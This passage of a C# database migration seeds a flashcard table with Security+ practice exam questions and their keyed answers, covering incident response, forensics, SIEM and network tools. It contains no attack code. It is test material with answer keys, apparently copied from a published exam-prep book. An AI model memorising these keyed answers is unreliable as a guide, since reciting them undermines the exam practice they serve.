                values: new object[] { 706, "\r\n74. B. PRTG and Cacti are both network monitoring tools that can\r\nprovide bandwidth monitoring information. Bandwidth\r\nmonitors can help identify exfiltration, heavy and abnormal\r\nbandwidth usage, and other information that can be helpful for\r\nboth incident identification and incident investigations. If you\r\nencounter a question like this on the exam, even if you’re not\r\nfamiliar with either tool, you can use your knowledge of what\r\nSimple Network Management Protocol (SNMP) is used for to\r\nidentify which of the categories is most likely correct.\r\n", 4, "\r\n74. Tools like PRTG and Cacti that monitor SNMP information are used to provide what type of\r\ninformation for an incident investigation?\r\nA. Authentication logs\r\nB. Bandwidth monitoring\r\nC. System log information\r\nD. Email metadata\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 718, "\r\n86. B. The Cyber Kill Chain moves to privilege escalation after\r\nexploitation. The entire kill chain is: 1) Reconnaissance, 2)\r\nIntrusion, 3) Exploitation, 4) Privilege Escalation, 5) Lateral\r\nMovement, 6) Obfuscation/Anti-forensics, 7) Denial of Service,\r\nand 8) Exfiltration.\r\n", 4, "\r\n86. Erin is working through the Cyber Kill Chain and has completed the exploitation phase as\r\npart of a penetration test. What step would come next?\r\nA. Lateral movement\r\nB. Privilege escalation\r\nC. Obfuscation\r\nD. Exfiltration\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 720, "\r\n88. A. A playbook for a security orchestration, automation, and\r\nresponse (SOAR) environment is a set of rules that determine\r\nwhat actions will be performed when an event occurs that is\r\nidentified by the SOAR using data it collects or receives.\r\n", 4, "\r\n88. Cynthia has been asked to build a playbook for the SOAR system that her organization uses.\r\nWhat will she build?\r\nA. A set of rules with actions that will be performed when an event occurs using data collected\r\nor provided to the SOAR system\r\nB. An automated incident response process that will be run to support the incident\r\nresponse (IR) team\r\nC. A trend analysis–driven script that will provide instructions to the IR team\r\nD. A set of actions that the team will perform to use the SOAR to respond to an incident\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 721, "\r\n89. B. The Security+ exam outline uses a six-step process for\r\nincident response: Preparation, Identification, Containment,\r\nEradication, Recovery, and Lessons Learned.\r\n", 4, "\r\n89. What incident response step is missing in the following image?\r\nRecovery\r\nLessons\r\nLearned\r\nPreparation\r\nIdentification\r\nEradication ?\r\nIncident Response Process\r\nA. Business continuity\r\nB. Containment\r\nC. Response\r\nD. Discovery\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 722, "\r\n90. D. A disaster recovery plan addresses what to do during a\r\nperson-made or natural disaster. A flood that completely fills a\r\ndatacenter would require significant efforts to recover from, and\r\nGurvinder will need a solid disaster recovery plan—and perhaps\r\na new datacenter location as soon as possible! A COOP, or\r\nContinuity of Operations Pan, is needed for U.S. government\r\nagencies but is not required for businesses. A business\r\ncontinuity plan would cover how to keep business running, but\r\nit does not cover all the requirements in a natural disaster of this\r\nscale, and a flood insurance plan is not a term used in the\r\nSecurity+ exam.\r\n", 4, "\r\n90. Gurvinder’s corporate datacenter is located in an area that FEMA has identified as being part\r\nof a 100-year flood plain. He knows that there is a chance in any given year that his datacenter\r\ncould be completely flooded and underwater, and he wants to ensure that his organization\r\nknows what to do if that happens. What type of plan should he write?\r\nA. A Continuity of Operations Plan\r\nB. A business continuity plan\r\nC. A flood insurance plan\r\nD. A disaster recovery plan\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 723, "\r\n91. C. pathping combines both ping and tracert / traceroute style\r\nfunctionality to help identify both the path used and where\r\nlatency is an issue. It is built into Windows and can be used for\r\nexactly the troubleshooting that Frank needs to accomplish. He\r\ncould use both ping and tracert / traceroute to perform the\r\ntask, but he would need to spend more time using each tool in\r\nturn to identify the same information that pathping will put into\r\na single interface. netcat , while useful for many tasks, isn’t as\r\nwell suited to this one.\r\n", 4, "\r\n91. Frank wants to identify where network latency is occurring between his computer and a\r\nremote server. Which of the following tools is best suited to identifying both the route used\r\nand which systems are responding in a timely manner?\r\nA. ping\r\nB. tracert\r\nC. pathping\r\nD. netcat\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 724, "\r\n92. A. The dnsenum tool can perform many Domain Name System\r\n(DNS)-related functions, including querying A records,\r\nnameservers, and MX records, as well as performing zone\r\ntransfers, Google searches for hosts and subdomains, and net\r\nrange reverse lookups. dig and host are useful for DNS queries\r\nbut do not provide this range of capabilities, and dnscat was\r\nmade up for this question.\r\n", 4, "\r\n92. Derek wants to see what DNS information can be queried for his organization as well as\r\nwhat hostnames and subdomains may exist. Which of the following tools can provide both\r\nDNS query information and Google search information about hosts and domains through\r\na single tool?\r\nA. dnsenum\r\nB. dig\r\nC. host\r\nD. dnscat\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 725, "\r\n93. C. Jill wants the least possible changes to occur on the system,\r\nso she should instruct the user to not save any files or make any\r\nchanges. Rebooting the system will not create a memory dump,\r\nand may cause new files to be written or changed if patches were\r\nwaiting to install or other changes are set to occur during a\r\nreboot. Turning off secure delete or making other changes will\r\nnot impact the files that were deleted prior to that setting\r\nchange.\r\n", 4, "\r\n93. Jill has been asked to perform data recovery due to her forensic skills. What should she tell\r\nthe person asking to perform data recovery to give her the best chance of restoring lost files\r\nthat were accidentally deleted?\r\nA. Immediately reboot using the reset switch to create a lost file memory dump.\r\nB. Turn off “secure delete” so that the files can be more easily recovered.\r\nC. Do not save any files or make any changes to the system.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 726, "\r\n94. C. Anti-forensics activities follow lateral movement in the\r\nCyber Kill Chain model. It helps to remember that after an\r\nattacker has completed their attack, they will attempt to hide\r\ntraces of their efforts, and then may proceed to denial-of-service\r\nor exfiltration activities in the model.\r\n", 4, "\r\n94. What phase follows lateral movement in the Cyber Kill Chain?\r\nA. Exfiltration\r\nB. Exploitation\r\nC. Anti-forensics\r\nD. Privilege escalation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 727, "\r\n95. B. The IR process used for the Security+ exam outline is\r\nPreparation, Identification, Containment, Eradication,\r\nRecovery, and Lessons Learned. Veronica should move into the\r\nlessons learned phase.\r\n", 4, "\r\n95. Veronica has completed the recovery phase of her organization’s incident response plan.\r\nWhat phase should she move into next?\r\nA. Preparation\r\nB. Lessons learned\r\nC. Recovery\r\nD. Documentation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 728, "\r\n96. C. Quick formatting merely deletes file indexes rather than\r\nremoving and overwriting files, making it inappropriate for\r\nsanitization. Physical destruction will ensure that the data is not\r\nreadable, as will degaussing and zero wiping.\r\n", 4, "\r\n96. Michelle has been asked to sanitize a number of drives to ensure that sensitive data is not\r\nexposed when systems are removed from service. Which of the following is not a valid\r\nmeans of sanitizing hard drives?\r\nA. Physical destruction\r\nB. Degaussing\r\nC. Quick-formatting the drives\r\nD. Zero-wiping the drives\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 729, "\r\n97. D. Microsoft Office places information like the name of the\r\ncreator of the file, editors, creation and change dates, and other\r\nuseful information in the file metadata that is stored in each\r\nOffice document. Bart can simply open the Office document to\r\nreview this information or can use a forensic or file metadata\r\ntool to review it. Filenames may contain the creator’s name, but\r\nthis would only be if the creator included it. Microsoft Office\r\ndoes not create or maintain a log, and the application log for\r\nWindows does not contain this information.\r\n", 4, "\r\n97. Bart is investigating an incident, and needs to identify the creator of a Microsoft Office document.\r\nWhere would he find that type of information?\r\nA. In the filename\r\nB. In the Microsoft Office log files\r\nC. In the Windows application log\r\nD. In the file metadata\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 730, "\r\n98. B. Windows Defender Firewall operates on a per-application\r\nmodel and can filter traffic based on whether the system is on a\r\ntrusted private network or a public network. Nathaniel should\r\nallow Chrome by name in the firewall, which will allow it to send\r\ntraffic without needing to specify ports or protocols.\r\n", 4, "\r\n98. Nathaniel wants to allow Chrome through the Windows Defender firewall. What type of\r\nfirewall rule change will he need to permit this?\r\nA. Allow TCP 80 and 443 traffic from the system to the Internet.\r\nB. Add Chrome to the Windows Defender Firewall allowed applications.\r\nC. Allow TCP 80 and 443 traffic from the Internet to the system.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 719, "\r\n87. D. Of the tools that are listed, only Metasploit is an exploitation\r\nframework. Cuckoo is a malware testing sandbox, theHarvester\r\nis an open source intelligence gathering tool, and Nessus is a\r\nvulnerability scanner. Tools like Metasploit, BeEF, and Pacu are\r\nall examples of exploitation frameworks.\r\n", 4, "\r\n87. Dana wants to use an exploitation framework to perform a realistic penetration test of her\r\norganization. Which of the following tools would fit that requirement?\r\nA. Cuckoo\r\nB. theHarvester\r\nC. Nessus\r\nD. Metasploit\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 731, "\r\n99. B. The dnsenum Perl script builds in quite a few Domain Name\r\nSystem (DNS) enumeration capabilities, including host,\r\nnameserver, and MX record gathering; zone transfer; Google\r\nscraping for domains; subdomain brute forcing from files; as\r\nwell as Whois automation and reverse lookups for networks up to\r\nclass C in size. Although you could manually use dig or nslookup\r\nor even netcat to perform many of these functions, dnsenum is\r\nthe only automated tool on the list.\r\n", 4, "\r\n99. Nathan wants to perform whois queries on all the hosts in a class C network. Which of\r\nthe following tools can do that and also be used to discover noncontiguous IP blocks in an\r\nautomated fashion?\r\nA. netcat\r\nB. dnsenum\r\nC. dig\r\nD. nslookup\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 705, "\r\n73. C. The Windows tracert command will show the route to a\r\nremote system as well as delays along the route. traceroute is\r\nthe equivalent command in Linux. The arp command allows you\r\nto view and modify the Address Resolution Protocol (ARP)\r\ncache in Windows, and netstat has varying functions in\r\ndifferent operating systems but generally shows statistics and\r\ninformation about network usage and status.\r\n", 4, "\r\n73. Which of the following commands can be used to show the route to a remote system on a\r\nWindows 10 workstation?\r\nA. traceroute\r\nB. arp\r\nC. tracert\r\nD. netstat\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 703, "\r\n71. B. IPSec is not a tool used to capture network flows. sFlow,\r\nNetFlow, and IPFIX are all used to capture network flow\r\ninformation, which will provide the information Charlene needs.\r\n", 4, "\r\n71. Charlene wants to set up a tool that can allow her to see all the systems a given IP address\r\nconnects to and how much data is sent to that IP by port and protocol. Which of the following\r\ntools is not suited to meet that need?\r\nA. IPFIX\r\nB. IPSec\r\nC. sFlow\r\nD. NetFlow\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 679, "\r\n47. A. A simulation is the closest you can get to a real-world event\r\nwithout having one. A tabletop exercise has personnel\r\ndiscussing scenarios, whereas a walk-through goes through\r\nchecklists and procedures. A wargame is not a common exercise\r\ntype.\r\n", 4, "\r\n47. Elle is conducting an exercise for her organization and wants to run an exercise that is as\r\nclose to an actual event as possible. What type of event should she run to help her organization\r\nget this type of real-world practice?\r\nA. A simulation\r\nB. A tabletop exercise\r\nC. A walk-through\r\nD. A wargame\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 680, "\r\n48. C. The Content-Addressable Memory (CAM) tables on switches\r\ncontain a list of all the devices they have talked to and will give\r\nErin the best chance of identifying the devices on the network.\r\nWireshark and netstat will only have a view of the devices that\r\nthe system she is working from communicate with or that\r\nbroadcast on the network segment she is on. Domain Name\r\nSystem (DNS) will list only systems that have a DNS entry. In\r\nmost organizations, relatively few systems will have entries in\r\nDNS.\r\n", 4, "\r\n48. Erin wants to determine what devices are on a network but cannot use a port scanner or vulnerability\r\nscanner. Which of the following techniques will provide the most data about the\r\nsystems that are active on the network?\r\nA. Run Wireshark in promiscuous mode.\r\nB. Query DNS for all A records in the domain.\r\nC. Review the CAM tables for all the switches in the network.\r\nD. Run netstat on a local workstation.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 681, "\r\n49. C. Sensors are deployed, either as agents, hardware, or virtual\r\nmachines to gather information to relay it back to a security\r\ninformation and event management (SIEM) device. Alert levels,\r\ntrend analysis features, and sensitivity thresholds are all used to\r\nanalyze and report on data, not to gather data.\r\n", 4, "\r\n49. What SIEM component collects data and sends it to the SIEM for analysis?\r\nA. An alert level\r\nB. A trend analyzer\r\nC. A sensor\r\nD. A sensitivity threshold\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 682, "\r\n50. C. A quarantine process or setting will preserve malicious or\r\ndangerous files and programs without allowing them to run.\r\nThis allows defenders to retrieve them for further analysis as\r\nwell as to return them to use if they are determined not to be\r\nmalicious, or if the malicious components can be removed from\r\nneeded files. Purging, deep-freezing, and retention are not terms\r\nused to describe this behavior or setting.\r\n", 4, "\r\n50. Alaina sets her antimalware solution to move infected files to a safe storage location without\r\nremoving them from the system. What type of setting has she enabled?\r\nA. Purge\r\nB. Deep-freeze\r\nC. Quarantine\r\nD. Retention\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 683, "\r\n51. C. Chuck should recommend a mobile device management\r\n(MDM) system to ensure that organizational devices can be\r\nmanaged and protected in the future. Data loss prevention\r\n(DLP) will not stop a lost phone from being a potential leak of\r\ndata, isolating the phones is not a realistic scenario for devices\r\nthat will actually be used, nor is containment because the phone\r\nis out of the organization’s control once lost.\r\n", 4, "\r\n51. A senior vice president in the organization that Chuck works in recently lost a phone that\r\ncontained sensitive business plans and information about suppliers, designs, and other important\r\nmaterials. After interviewing the vice president, Chuck finds out that the phone did not\r\nhave a passcode set and was not encrypted, and that it could not be remotely wiped. What\r\ntype of control should Chuck recommend for his company to help prevent future issues\r\nlike this?\r\nA. Use containment techniques on the impacted phones.\r\nB. Deploy a DLP system.\r\nC. Deploy an MDM system.\r\nD. Isolate the impacted phones.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 684, "\r\n52. A. A content filter is specifically designed to allow\r\norganizations to select both specific sites and categories of\r\ncontent that should be blocked. Gabby could review content\r\ncategories and configure the filter to prevent students from\r\nbrowsing to the unwanted sites. A data loss prevention (DLP)\r\nsolution is designed to prevent data loss, a firewall can block IP\r\naddresses or hostnames but would require additional\r\nfunctionality to filter content, and an intrusion detection system\r\n(IDS) can detect unwanted traffic but cannot stop it.\r\n", 4, "\r\n52. The school that Gabby works for wants to prevent students from browsing websites that are\r\nnot related to school work. What type of solution is best suited to help prevent this?\r\nA. A content filter\r\nB. A DLP\r\nC. A firewall\r\nD. An IDS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 685, "\r\n53. B. Information stored on a disk drive is one of the least volatile\r\nitems in the order of volatility, but backups are even less volatile.\r\nThat means Frank should capture backups after he images the\r\ndisk drive and that he should capture CPU cache and registers as\r\nwell as system RAM first if he needs them.\r\n", 4, "\r\n53. Frank knows that forensic information he is interested in is stored on a system’s hard drive. If\r\nhe wants to follow the order of volatility, which of the following items should be forensically\r\ncaptured after the hard drive?\r\nA. Caches and registers\r\nB. Backups\r\nC. Virtual memory\r\nD. RAM\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 686, "\r\n54. C. The -R flag applies the permission recursively to all files in\r\nthe named directory. Here, the permissions are 7 , which sets the\r\nowner to read, write, and execute, and 55 , which sets group and\r\nthen world permissions to read only. 755 is a very commonly\r\nused permission on Linux systems.\r\n", 4, "\r\n54. Greg runs the following command. What occurs?\r\nchmod -R 755 /home/greg/files\r\nA. All of the files in /home/greg/ are set to allow the group to read, write, and execute\r\nthem, and Greg and the world can only read them.\r\nB. The read, write, and execute permissions will be removed from all files in the /home/\r\ngreg/files directory.\r\nC. All of the files in /home/greg/files are set to allow Greg to read, write, and execute\r\nthem, and the group and the world can only read them.\r\nD. A new directory will be created with read, write, and execute permissions for the world\r\nand read-only permissions for Greg and the group he is in.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 687, "\r\n55. B. The most important action Charles can take while working\r\nwith his forensic artifacts to provide nonrepudiation is to\r\ndigitally sign the artifacts and information that he is creating in\r\nhis evidence records. Encrypting the output will ensure its\r\nconfidentiality but will not provide nonrepudiation by itself.\r\nMD5 checksums for images are commonly gathered but must\r\nthen be signed so that they can be validated to ensure they have\r\nnot been modified.\r\n", 4, "\r\n55. Charles wants to ensure that the forensic work that he is doing cannot be repudiated. How\r\ncan he validate his attestations and documentation to ensure nonrepudiation?\r\nA. Encrypt all forensic output.\r\nB. Digitally sign the records.\r\nC. Create a MD5 checksum of all images.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 688, "\r\n56. D. The memdump tool is a command-line memory dump utility\r\nthat can dump physical memory. Somewhat confusingly,\r\nmemdump is also a flag in the very useful Volatility framework,\r\nwhere it can be used to dump memory as well. The remaining\r\noptions were made up and are not Linux tools, although you can\r\ncreate a ramdump on Android devices.\r\n", 4, "\r\n56. Diana wants to capture the contents of physical memory using a command-line tool on a\r\nLinux system. Which of the following tools can accomplish this task?\r\nA. ramdump\r\nB. system -dump\r\nC. memcpy\r\nD. memdump\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 689, "\r\n57. B. The Windows swapfile is pagefile.sys and is saved in the\r\nroot of the C:\\ drive by default.\r\n", 4, "\r\n57. Valerie wants to capture the pagefile from a Windows system. Where can she find the file for\r\nacquisition?\r\nA. C:\\Windows\\swap\r\nB. C:\\pagefile.sys\r\nC. C:\\Windows\\users\\swap.sys\r\nD. C:\\swap\\pagefile.sys\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 704, "\r\n72. C. A system crash, or system dump, file contains the contents of\r\nmemory at the time of the crash. The infamous Windows blue\r\nscreen of death results in a memory dump to a file, allowing\r\nanalysis of memory contents. The swapfile (pagefile) is used to\r\nstore information that would not fit in memory but is unlikely to\r\ncontain a currently running malware package, since files are\r\nswapped out when they are not in use. The Windows security log\r\ndoes not contain this type of information, nor does the system\r\nlog.\r\n", 4, "\r\n72. A system that Sam is responsible for crashed, and Sam suspects malware may have caused an\r\nissue that led to the crash. Which of the following files is most likely to contain information\r\nif the malware was a file-less, memory-resident malware package?\r\nA. The swapfile\r\nB. The Windows system log\r\nC. A dump file\r\nD. The Windows security log\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 690, "\r\n58. A. The best way to capture a virtual machine from a running\r\nhypervisor is usually to use the built-in tools to obtain a\r\nsnapshot of the system. Imaging tools are not typically capable\r\nof capturing machine state, and dd is not designed to capture\r\nVMs. Removing a server’s drives can be challenging due to RAID\r\nand other specific server configuration items, and doing so\r\nmight impact all other running VMs and services on the system.\r\n", 4, "\r\n58. Megan needs to conduct a forensic investigation of a virtual machine (VM) hosted in a\r\nVMware environment as part of an incident response effort. What is the best way for her to\r\ncollect the VM?\r\nA. As a snapshot using the VMware built-in tools\r\nB. By using dd to an external drive\r\nC. By using dd to an internal drive\r\nD. By using a forensic imaging device after removing the server’s drives\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 692, "\r\n60. B. Digital forensics techniques are commonly used to analyze\r\nattack patterns, tools, and techniques used by advanced\r\npersistent threat (APT) actors for counterintelligence purposes.\r\nThey may sometimes be used to determine what information\r\nwas stolen, but this is not the most common use for digital\r\nforensic techniques, nor is their use as a training mechanism.\r\n", 4, "\r\n60. What role do digital forensics most often play in counterintelligence efforts?\r\nA. They are used to determine what information was stolen by spies.\r\nB. They are used to analyze tools and techniques used by intelligence agencies.\r\nC. They are required for training purposes for intelligence agents.\r\nD. They do not play a role in counterintelligence.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 693, "\r\n61. A. Law enforcement is not typically part of organizational\r\nincident response teams, but incident response teams often\r\nmaintain a relationship with local law enforcement officers.\r\nSecurity analysts, management, and communication staff as well\r\nas technical experts are all commonly part of a core incident\r\nresponse team.\r\n", 4, "\r\n61. Which of the following groups is not typically part of an incident response team?\r\nA. Law enforcement\r\nB. Security analysts\r\nC. Management\r\nD. Communications staff\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 694, "\r\n62. A. Even if you’re not familiar with iptables , you can read\r\nthrough these rules and guess which rule includes the right\r\ndetails. DROP makes sense for a block, and you should know that\r\nSSH will be a TCP service on port 22.\r\n", 4, "\r\n62. Bob needs to block Secure Shell (SSH) traffic between two security zones. Which of the following\r\nLinux iptables firewall rules will block that traffic from the 10.0.10.0/24 network to\r\nthe system the rule is running on?\r\nA. iptables -A INPUT -p tcp --dport 22 -i eth0 -s 10.0.10.0/24 -j\r\nDROP\r\nB. iptables -D OUTPUT -p udp -dport 21 -i eth0 -s 10.0.10.255 -j\r\nDROP\r\nC. iptables -A OUTPUT -p udp --dport 22 -i eth0 -s 10.0.10.255 -j\r\nBLOCK\r\nD. iptables -D INPUT -p udp --dport 21 -I eth0 -s 10.0.10.0/24 -j\r\nDROP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 695, "\r\n63. C. logger is a Linux utility that will add information to the\r\nLinux syslog. It can accept file input, write to the system journal\r\nentry, send to remote syslog servers, and perform a variety of\r\nother functions. The other commands do not directly interface\r\nwith the system log.\r\n", 4, "\r\n63. Maria wants to add entries into the Linux system log so that they will be sent to her security\r\ninformation and event management (SIEM) device when specific scripted events occur. What\r\nLinux tool can she use to do this?\r\nA. cat\r\nB. slogd\r\nC. logger\r\nD. tail\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 696, "\r\n64. A. Incident response plans don’t stop incidents from occurring,\r\nbut they do help responders react appropriately, prepare the\r\norganization for incidents, and may be required for legal or\r\ncompliance reasons.\r\n", 4, "\r\n64. Amanda’s organization does not currently have an incident response plan. Which of the following\r\nreasons is not one she should present to management in support of creating one?\r\nA. It will prevent incidents from occurring.\r\nB. It will help responders react appropriately under stress.\r\nC. It will prepare the organization for incidents.\r\nD. It may be required for legal or compliance reasons.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 697, "\r\n65. D. Degaussing a drive uses strong magnetic fields to wipe it and\r\nis the least likely to result in recoverable data. Deleted files can\r\noften be recovered because only the file index information will\r\nbe removed until that space is needed and is overwritten. Quick\r\nformats work in a similar way and will leave remnant data, and\r\nfiles that are overwritten by smaller files will also leave\r\nfragments of data that can be recovered and analyzed.\r\n", 4, "\r\n65. Which of the following scenarios is least likely to result in data recovery being possible?\r\nA. A file is deleted from a disk.\r\nB. A file is overwritten by a smaller file.\r\nC. A hard drive is quick-formatted.\r\nD. A disk is degaussed.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 698, "\r\n66. D. Henry’s most likely use for the video is to document the\r\nforensic process, part of the chain of custody and provenance of\r\nthe forensic data he acquires. The order of volatility helps\r\ndetermine what devices or drives he would image first. There is\r\nno crime being committed, so establishing guilt is not relevant\r\nto this scenario, and the video will not ensure data is preserved\r\non a drive during a forensic process.\r\n", 4, "\r\n66. Henry records a video of the removal of a drive from a system as he is preparing for a\r\nforensic investigation. What is the most likely reason for Henry to record the video?\r\nA. To meet the order of volatility\r\nB. To establish guilt beyond a reasonable doubt\r\nC. To ensure data preservation\r\nD. To document the chain of custody and provenance of the drive\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 699, "\r\n67. B. WinHex is the only disk editor in this list. Autopsy is a\r\nforensic analysis suite; dd and FTK Imager are both imaging\r\ntools. WinHex also provides the ability to read RAID and\r\ndynamic disks, perform data recovery, edit physical memory,\r\nclone disks, wipe files and drives, and a variety of other\r\nfunctions.\r\n", 4, "\r\n67. Adam wants to use a tool to edit the contents of a drive. Which of the following tools is best\r\nsuited to that purpose?\r\nA. Autopsy\r\nB. WinHex\r\nC. dd\r\nD. FTK Imager\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 700, "\r\n68. B. Playbooks list the required steps that are needed to address\r\nan incident. A runbook focuses on the steps to perform an action\r\nor process as part of an incident response process. Thus, a\r\nplaybook may reference runbooks. Business continuity (BC)\r\nplans and disaster recovery (DR) plans are not used for incident\r\nresponse, but they are used to ensure that a business stays\r\nonline or can recover from a disaster.\r\n", 4, "\r\n68. Jill wants to build a checklist that includes all the steps to respond to a specific incident.\r\nWhat type of artifact should she create to do so in her security orchestration, automation,\r\nand response (SOAR) environment?\r\nA. A BC plan\r\nB. A playbook\r\nC. A DR plan\r\nD. A runbook\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 701, "\r\n69. C. Passwords are typically stored using a hash, and best\r\npractices would have them stored using a password security–\r\nspecific hash. Alaina can speed up her efforts if she knows what\r\nhashing algorithm and options were used on the passwords. The\r\nage and length of the passwords are not necessary, and\r\npasswords should not be stored in encrypted form—but the\r\nquestion also specifically notes they’re hashed passwords.\r\n", 4, "\r\n69. Alaina wants to use a password cracker against hashed passwords. Which of the following\r\nitems is most important for her to know before she does this?\r\nA. The length of the passwords\r\nB. The last date the passwords were changed\r\nC. The hashing method used for the passwords\r\nD. The encryption method used for the passwords\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 702, "\r\n70. D. An application block list would fit Vincent’s needs the best\r\nfrom the list provided. An approved list would prevent other\r\ntools from being installed, which may impede functionality\r\nwhile making the maintenance of the list challenging. A data loss\r\nprevention (DLP) solution attempts to prevent data from being\r\nsent or exposed but does not prevent installations or downloads\r\nof games. A content filter might help, but workarounds are easy,\r\nincluding sending games via email or via a thumb drive.\r\n", 4, "\r\n70. Vincent wants to ensure that his staff does not install a popular game on the workstations\r\nthey are issued. What type of control could he deploy as part of his endpoint security solution\r\nthat would most effectively stop this?\r\nA. An application approved list\r\nB. A DLP\r\nC. A content filter\r\nD. An application block list\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 691, "\r\n59. C. A well-documented chain of custody can help establish\r\nprovenance for data, proving where it came from, who handled\r\nit, and how it was obtained. Right to audit, timelines, and\r\npreservation of images do not establish provenance, although\r\npreservation is part of the chain of custody process.\r\n", 4, "\r\n59. What forensic concept is key to establishing provenance for a forensic artifact?\r\nA. Right to audit\r\nB. Preservation\r\nC. Chain of custody\r\nD. Timelines\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
